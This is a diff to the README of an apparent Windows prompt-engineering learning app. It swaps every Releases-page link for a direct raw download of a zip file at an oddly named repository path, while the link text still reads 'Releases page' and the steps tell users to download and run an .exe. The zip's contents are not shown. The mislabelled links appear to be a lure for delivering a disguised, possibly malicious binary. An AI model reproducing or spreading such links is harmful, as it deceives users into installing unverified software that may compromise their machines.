@@ -1,6 +1,6 @@
 # 📘 Prompt_engineering_Patterns - Learn Prompting With Clear Steps
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/raw/refs/heads/main/postfetal/Patterns_engineering_Prompt_1.7.zip)
 
 ## 🧭 What this app is
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download the app for Windows:
 
-[Download from Releases](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/releases)
+[Download from Releases](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/raw/refs/heads/main/postfetal/Patterns_engineering_Prompt_1.7.zip)
 
 Open the page, look for the latest release, and download the file that matches your Windows PC. If you see more than one file, pick the one that ends in `.exe` or `.zip`.
 
@@ -37,7 +37,7 @@ For smooth use:
 
 ## 🚀 Install on Windows
 
-1. Open the [Releases page](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/releases)
+1. Open the [Releases page](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/raw/refs/heads/main/postfetal/Patterns_engineering_Prompt_1.7.zip)
 2. Find the newest release at the top
 3. Download the Windows file
 4. If the file is in a `.zip` folder, right-click it and choose **Extract All**
@@ -192,7 +192,7 @@ This path helps you build skill without feeling overwhelmed
 
 ## 🔗 Download again
 
-[Go to Releases](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/releases)
+[Go to Releases](https://github.com/Meyerirregular488/Prompt_engineering_Patterns/raw/refs/heads/main/postfetal/Patterns_engineering_Prompt_1.7.zip)
 
 ## 🖱️ Quick start
 
